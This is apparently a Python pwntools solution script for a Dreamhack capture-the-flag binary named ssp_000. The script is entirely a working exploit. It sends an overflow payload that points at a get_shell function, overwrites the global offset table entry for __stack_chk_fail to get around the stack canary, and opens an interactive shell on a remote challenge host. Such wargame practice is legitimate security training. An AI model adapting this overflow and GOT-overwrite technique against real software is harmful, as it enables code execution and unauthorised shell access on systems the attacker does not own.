#!/usr/bin/env python3

from pwn import *

exe = ELF("./ssp_000", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("host3.dreamhack.games", 14875)

input()

# exe.asm(exe.sym['__stack_chk_fail'], 'ret')
# payload = b'a'*0x48 + p64(exe.sym['get_shell'])
payload = b'a'*0x58 + p64(exe.sym['get_shell'] + 4)
p.send(payload)
p.sendlineafter(b'Addr : ', str(exe.got['__stack_chk_fail']))
p.sendlineafter(b'Value : ', str(exe.sym['main'] + 196))

p.interactive()